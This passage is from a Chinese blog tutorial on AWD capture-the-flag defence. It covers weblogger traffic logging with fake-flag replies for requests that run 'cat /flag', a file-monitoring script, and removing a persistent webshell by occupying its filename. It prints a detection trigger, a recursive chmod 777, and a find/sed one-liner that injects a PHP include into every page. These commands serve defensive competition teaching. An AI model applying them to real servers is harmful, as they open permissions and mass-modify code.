+<h4 id="4-3-1、weblogger部署"><a href="#4-3-1、weblogger部署" class="headerlink" title="4.3.1、weblogger部署"></a>4.3.1、weblogger部署</h4><p>1.将资料中的weblogger.zip解压，并上传至Web目录</p>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627145943472.png" alt="image-20240627145943472"></p>
+<p>2.修改目录权限为777</p>
+<pre><code>cd /web
+chmod -R 777 weblogger/
+</code></pre>
+<p>3.浏览器访问：<a href="http://IP:端口/weblogger/install.php">http://IP:端口/weblogger/install.php</a> </p>
+<p>4.内容默认即可，点击提交查询</p>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627145959371.png" alt="image-20240627145959371"></p>
+<p>5.配置管理员用户和密码，账号密码是管理页面的账号密码（填复杂点，难爆破的）</p>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627150011167.png" alt="image-20240627150011167"></p>
+<p>6.提交后出现以下页面，则表示成功</p>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20250113223100048.png" alt="image-20250113223100048"></p>
+<p>在浏览器访问managepath管理后台</p>
+<p> <a href="http://IP:端口/3d9f037601e4db251a1e6e3a09ffe995/78213625b5ab9be804875197c0dab397/managelog.php">http://IP:端口/3d9f037601e4db251a1e6e3a09ffe995/78213625b5ab9be804875197c0dab397/managelog.php</a></p>
+<p>输入配置的管理员用户和密码</p>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627150048060.png" alt="image-20240627150048060"></p>
+<p><strong>提交后可能出现空格页面，再次刷新即可！</strong></p>
+<p>7.与Waf部署一样，在每个页面加入</p>
+<pre><code class="php">&lt;?php require_once &quot;/tmp/ada403aa7b220c87186603a5549db3a0/weblogpro.php&quot;;?&gt;
+</code></pre>
+<pre><code>#批量插入并排除weblogger生成的目录（目录名根据实际情况）
+find /web/ -path &#39;/web/0539a93843a715daf72dc6b7edfb352d&#39; -prune -o -type f -name &#39;*.php&#39;  -exec sed -i &#39;1i&lt;?php require_once(&quot;/tmp/ada403aa7b220c87186603a5549db3a0/weblogpro.php&quot;);?&gt;&#39; &#123;&#125; \; -o -print
+</code></pre>
+<h4 id="4-3-2、weblogger功能"><a href="#4-3-2、weblogger功能" class="headerlink" title="4.3.2、weblogger功能"></a>4.3.2、weblogger功能</h4><p>参考：<a target="_blank" rel="noopener" href="https://gist.github.com/wupco/ee26f88656fbf36d014f49b4ac47ddc8">help.md · GitHub</a></p>
+<ul>
+<li><p>All log：列出所有日志；</p>
+</li>
+<li><p>IP LIST：列出所有访问ip；</p>
+</li>
+<li><p>RISK HIGH：列出拿到flag的流量；</p>
+</li>
+<li><p>MOST_PROB_PAYLOAD：按照是exp的可能性排序所有流量；</p>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627150201497.png" alt="image-20240627150201497"></p>
+</li>
+</ul>
+<p>同时根部署时的第四步配置：<code>cat /flag</code></p>
+<p>一旦有IP请求的数据包携带该方式读取flag，会被替换成虚假数据：</p>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627150217274.png" alt="image-20240627150217274"></p>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627150225172.png" alt="image-20240627150225172"></p>
+<p>同时该IP会被拉入黑名单，访问我方Web服务任意请求，Weblogger都会拦截并显示虚假flag</p>
+<pre><code>这种处置，很容易让攻击服务意识到自己获取的是虚假flag
+</code></pre>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627150248073.png" alt="image-20240627150248073"></p>
+<p>日志也会同时记录</p>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627150258615.png" alt="image-20240627150258615"></p>
+<h3 id="4-4、文件监控"><a href="#4-4、文件监控" class="headerlink" title="4.4、文件监控"></a>4.4、文件监控</h3><p>文件监控主要是为了解决其他队伍上传WebShell或删除Web原本文件导致服务失效而扣分问题</p>
+<p>在应急响应课程中，我们利用了find命令来查找有修改的文件</p>
+<p>其实也可以利用脚本来实现实时监控，同时还可以在脚本中自动进行处理</p>
+<p>比如删除文件自动恢复，上传WebShell自动查杀等等</p>
+<p>修改资料中的文件监控脚本file_monitor.py：</p>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627150323938.png" alt="image-20240627150323938"></p>
+<p>修改完成后上传至Web服务并启动：</p>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627150339211.png" alt="image-20240627150339211"></p>
+<pre><code>python2 file_monitor.py
+</code></pre>
+<p>自动备份+自动恢复被修改文件+删除上传文件：</p>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627150402025.png" alt="image-20240627150402025"></p>
+<h3 id="4-5、不死马清理"><a href="#4-5、不死马清理" class="headerlink" title="4.5、不死马清理"></a>4.5、不死马清理</h3><p>如果部署了文件监控，或者上传不死马生成脚本被Waf拦截自然不用担心不死马的出现</p>
+<p>本节讨论的是如果已经被植入不死马，如何对不死马进行清理</p>
+<p>要杀死生成不死马进程，只能重启apache服务清理内存</p>
+<p>但是比赛期间一般不会有权限重启或者重启会扣除相应分数且有次数限制</p>
+<p>虽然杀死不死马进程行不通，但是只要让不死马失效即可</p>
+<p>可以通过建立一个和不死马一样名字的文件夹，这样不死马文件名占用就无法在生成文件，即可达成克制不死马的效果</p>
+<pre><code># .shell.php 为不死马文件名
+cd /web/admin/upload
+rm -rf .shell.php | mkdir .shell.php
+</code></pre>
+<p><img src="/AWD%E5%AD%A6%E4%B9%A0.assets/image-20240627150437946.png" alt="image-20240627150437946"></p>
+<h3 id="4-6、总结"><a href="#4-6、总结" class="headerlink" title="4.6、总结"></a>4.6、总结</h3><p>攻防一体，蓝队的技术即根据如何攻击，反向完成对应的防守</p>
+<p>本章节主要分享一些技巧与思路，除本节的技术之外</p>
+<p>应急响应篇中的技术都是蓝队部分的内容</p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    <div id="comment">
+        <div id="twikoo-container"></div>
+    </div>
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2025 eemotionnの小窝
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;eemotionn
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+<script>
+    twikoo.init({
+        el: "#twikoo-container",
+        envId: "https://weikoo.vercel.app",
+        region: "",
+        path: location.pathname,
+        lang: "",
+    })
+</script>
+
+
+    
+</body>
+</html>
+
+
